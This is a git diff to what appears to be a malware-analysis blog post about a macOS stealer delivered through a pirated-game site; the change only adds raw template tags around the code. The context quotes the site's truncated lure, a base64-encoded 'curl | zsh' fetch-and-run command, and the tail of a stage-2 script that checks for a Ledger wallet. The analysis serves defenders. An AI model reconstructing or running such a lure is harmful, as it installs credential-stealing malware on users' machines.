@@ -38,6 +38,8 @@ For starters, the site with the terminal command provides a simple one-click cop
 ![Pirated game site showing one-click copy button and terminal command instructions](/assets/img/2026-03-01-when-free-costs-your-keychain/01-d1bee8c2-410d-4cbf-a566-54404ad9999d-image.png)
 The command in full ends up being (truncated; do not reconstruct or run):
 
+{% raw %}
+
 ```shell
 echo 'ZWNobyAnSW5zdGFsbGluZyBwYWNrYWdlIHBsZWFzZSB3YWl0Li4uJyAmJiBjdXJsIC1rZnNTTCBod...'|base64 -D|zsh
 ```
@@ -265,6 +267,8 @@ if ledger_installed then
 
 end if
 ```
+
+{% endraw %}
 
 This stage 2 payload is the heavy lifter. We see the following in the payload:
 
